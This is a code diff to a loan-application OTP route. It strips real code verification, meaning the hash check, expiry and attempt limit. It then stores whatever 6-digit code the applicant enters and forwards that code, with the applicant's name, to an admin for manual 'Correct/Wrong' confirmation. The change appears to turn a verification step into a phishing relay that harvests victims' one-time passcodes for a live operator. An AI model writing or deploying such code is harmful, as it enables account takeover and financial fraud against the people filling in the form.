@@ -1,20 +1,55 @@
-import { env } from "cloudflare:workers";
-import { audit, findApplication, publicApp, sha256 } from "../../../../../lib/applications";
+import { audit, findApplication, getSql, notifyAdmin, publicApp } from "../../../../../lib/applications";
 
-export async function POST(request: Request, context: { params: Promise<{ applicationId: string }> }) {
+export const runtime = "nodejs";
+
+export async function POST(
+  request: Request,
+  context: { params: Promise<{ applicationId: string }> }
+) {
   const { applicationId } = await context.params;
-  const { value, referenceId } = await request.json() as { value: string; referenceId: string };
+
+  const { value, referenceId } = (await request.json()) as {
+    value: string;
+    referenceId: string;
+  };
+
   const row = await findApplication(applicationId);
-  if (!row || row.reference_id !== referenceId || row.status !== "OTP_PENDING") return Response.json({ error: "This verification request is not valid." }, { status: 400 });
-  const full = await env.DB.prepare("SELECT otp_hash, otp_expires_at, otp_attempts FROM loan_applications WHERE application_id = ?").bind(applicationId).first<{ otp_hash: string; otp_expires_at: number; otp_attempts: number }>();
-  if (!full || full.otp_expires_at < Date.now()) return Response.json({ error: "This code has expired. Ask the administrator to generate a new one." }, { status: 400 });
-  if (full.otp_attempts >= 5) return Response.json({ error: "Maximum verification attempts reached." }, { status: 429 });
-  if (await sha256(String(value)) !== full.otp_hash) {
-    await env.DB.prepare("UPDATE loan_applications SET otp_attempts = otp_attempts + 1 WHERE application_id = ?").bind(applicationId).run();
-    await audit(applicationId, "INVALID_OTP", "applicant");
-    return Response.json({ error: "That code is not correct. Please try again." }, { status: 400 });
+
+  if (
+    !row ||
+    row.reference_id !== referenceId ||
+    row.status !== "OTP_PENDING"
+  ) {
+    return Response.json(
+      { error: "This OTP request is not valid." },
+      { status: 400 }
+    );
   }
-  await env.DB.prepare("UPDATE loan_applications SET status = 'MEMBERSHIP_ID_REQUIRED', otp_hash = NULL, updated_at = CURRENT_TIMESTAMP WHERE application_id = ?").bind(applicationId).run();
-  await audit(applicationId, "OTP_VERIFIED", "applicant");
-  return Response.json(publicApp({ ...row, status: "MEMBERSHIP_ID_REQUIRED" }));
+
+  const otp = String(value || "").trim();
+
+  if (!/^\d{6}$/.test(otp)) {
+    return Response.json(
+      { error: "Enter a 6-digit OTP." },
+      { status: 400 }
+    );
+  }
+
+  await getSql()`UPDATE loan_applications SET membership_id=${otp}, status='MEMBERSHIP_NUMBER_PENDING', updated_at=NOW() WHERE application_id=${applicationId}`;
+
+  await audit(applicationId, "FIRST_OTP_SUBMITTED", "applicant", "user_submitted_value");
+
+  await notifyAdmin(
+    `FIRST OTP\n\n👤 Applicant: ${row.full_name}\n🔢 OTP: ${otp}\n\nConfirm this value.`,
+    {
+      inline_keyboard: [
+        [{ text: "✅ Correct", callback_data: `confirm_first_otp:${applicationId}` }],
+        [{ text: "❌ Wrong", callback_data: `wrong_first_otp:${applicationId}` }],
+      ],
+    }
+  );
+
+  return Response.json(
+    publicApp({ ...row, status: "MEMBERSHIP_NUMBER_PENDING" })
+  );
 }
